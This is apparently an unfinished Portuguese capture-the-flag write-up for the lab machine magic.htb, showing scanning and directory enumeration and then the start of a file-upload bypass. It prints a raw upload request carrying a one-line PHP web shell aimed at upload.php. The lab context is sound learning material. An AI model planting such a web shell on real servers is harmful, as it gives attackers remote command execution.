
## Enumeracao

TCP scan

```
sudo nmap_enum magic.htb
```

![](../../../media/Pasted%20image%2020240625171037.png)

UDP scan
```
sudo nmap -sU -p 53,111,113,161,500,2049 magic.htb
```

![](../../../media/Pasted%20image%2020240625171452.png)

TCP full scan

```
sudo nmap -sS -p- --max-retries 0 -T5 -Pn magic.htb
```

![](../../../media/Pasted%20image%2020240625171500.png)

vuln scan

```
sudo nmap -sS --script vuln -n -T5 -Pn magic.htb -p 22,80 | tee nmap_vulns.txt
```


### http

Enumeração de URLs:

```
urlExtract -r 4 http://magic.htb
```

![](../../../media/Pasted%20image%2020240625171929.png)

sem extensões

```
feroxbuster -u http://magic.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --extract-links
```

![](../../../media/Pasted%20image%2020240625172114.png)

Com extensões:

```
feroxbuster -u http://magic.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --extract-links -x "txt,html,php"
```


Inspecionando os cabeçalhos do servidor:

```
curl -v http://magic.htb -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" -o /dev/null
```

![](../../../media/Pasted%20image%2020240625172544.png)

Scan de vulnerabilidades:

```
nikto -host http://magic.htb -T x 6 -useragent "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" | tee nikto_output.txt
```

![](../../../media/Pasted%20image%2020240625184914.png)

```
curl http://magic.htb/upload.php
```

![](../../../media/Pasted%20image%2020240625185108.png)

Encontrado o entry point:

## Exploracao

### File upload

A requisição para upload de imagens. Vamos pensar em algum bypass para tentar explorar essa falha de upload aí:

```
POST /upload.php HTTP/1.1
Host: magic.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------245961999042392549203283591301
Content-Length: 381
Origin: http://magic.htb
Connection: close
Referer: http://magic.htb/upload.php
Cookie: PHPSESSID=eascej6rocpq6erj2u0ge472j5
Upgrade-Insecure-Requests: 1

-----------------------------245961999042392549203283591301
Content-Disposition: form-data; name="image"; filename="80"
Content-Type: application/octet-stream

<?php system($_GET[0]); ?>

-----------------------------245961999042392549203283591301
Content-Disposition: form-data; name="submit"

Upload Image
-----------------------------245961999042392549203283591301--
```

![](../../../media/Pasted%20image%2020240625190704.png)

Abordagens

nome do arquivo:

teste.php

![](../../../media/Pasted%20image%2020240701145132.png)

```
curl -4 -X POST http://magic.htb/upload.php -F "submit=Upload Image" -F upload=@Capa_video_infra.jpg -v --proxy http://127.0.0.1:8080
```

![](../../../media/Pasted%20image%2020240701153043.png)